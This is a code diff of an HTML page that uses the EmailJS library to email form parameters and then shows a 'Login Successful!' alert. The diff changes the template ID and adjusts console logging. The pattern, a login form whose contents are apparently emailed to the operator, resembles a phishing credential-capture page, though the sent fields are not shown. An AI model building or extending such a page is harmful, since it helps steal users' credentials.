@@ -6,7 +6,6 @@
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
   <script>
-    // ✅ FIXED EmailJS initialization
     emailjs.init({
       publicKey: "aU_rVriMIfRSDIniQ"
     });
@@ -43,7 +42,6 @@
       margin-bottom:25px;
       font-size:35px;
       letter-spacing:2px;
-
       animation: glowMove 2s ease-in-out infinite alternate;
     }
 
@@ -130,15 +128,16 @@ function sendMail(){
 
     emailjs.send(
         "service_bqnzz7f",
-        "template_0vab5oa",
+        "template_lxwj7sw",
         params
     )
     .then(function(response){
         alert("Login Successful!");
+        console.log("SUCCESS:", response);
     })
     .catch(function(error){
-        console.log("ERROR:", error);
         alert("FAILED - check console (F12)");
+        console.log("ERROR:", error);
     });
 
 }
